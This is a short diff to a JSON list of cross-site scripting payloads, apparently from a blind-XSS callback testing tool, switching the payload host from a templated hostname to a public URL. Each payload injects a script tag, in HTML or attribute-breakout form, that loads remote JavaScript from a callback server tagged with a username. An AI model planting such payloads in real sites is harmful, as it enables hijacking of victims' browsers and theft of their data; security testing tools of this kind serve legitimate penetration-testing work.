@@ -2,14 +2,14 @@
   {
     "context":"html",
     "payloads":[
-      "<script src=http://{{ HOSTNAME }}/callback/{{ USERNAME }}></script>",
-      "<script src=$.getScript(\"http://{{ HOSTNAME }}/callback/{{ USERNAME }}\")></script>"
+      "<script src={{ PUBLIC_URL }}/callback/{{ USERNAME }}></script>",
+      "<script src=$.getScript(\"{{ PUBLIC_URL }}/callback/{{ USERNAME }}\")></script>"
     ]
   },
   {
     "context":"attribute",
     "payloads":[
-      "\"><script src=http://{{ HOSTNAME }}/callback/{{ USERNAME }}></script>"
+      "\"><script src={{ PUBLIC_URL }}/callback/{{ USERNAME }}></script>"
     ]
   }
 ]
